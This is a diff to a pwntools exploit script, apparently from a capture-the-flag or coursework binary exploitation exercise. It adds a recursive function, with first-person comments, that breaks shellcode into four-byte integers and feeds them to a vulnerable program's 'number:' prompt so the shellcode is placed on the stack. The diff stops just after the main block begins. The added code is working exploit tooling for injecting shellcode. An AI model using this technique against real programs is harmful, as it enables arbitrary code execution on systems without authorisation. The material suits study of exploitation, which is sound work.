@@ -1,5 +1,30 @@
 from pwn import *
 
+def put_shellcode_on_stack(binary_code, exploitable_process):
+    # This function is designed to read shellcode and push it onto the stack.
+    # Because the victim program only accepts string representations of integers (4 bytes),
+    # I needed to break down the shellcode into packets of this size.
+    # To do this, I chose to use recursion.
+
+    # First, I read in the four bytes of the assembled shell code.
+    # At the same time, I convert those bytes into an integer.
+    code_as_int = u32(binary_code[:4])
+
+    # I turn the int into a string to be accepted by the program input.
+    # To send it using pwntools, I encode it into a byte and pass it to the program.
+    exploitable_process.sendlineafter(b"number:", str(code_as_int).encode())
+
+    # Because the recursive function call will result in an IndexError once I run out of bytes to read,
+    # I handle the error safely to continue my exploit code running.
+    try:
+        # I check if there are any remaining bytes to read.
+        if binary_code != b'':
+            # If there are, I call the function again to read the remaining portion.
+            put_shellcode_on_stack(binary_code[4:], exploitable_process)
+    except IndexError:
+        return
+    return
+
 if __name__ == "__main__":
 
     # Declaring some variables that will be used later.
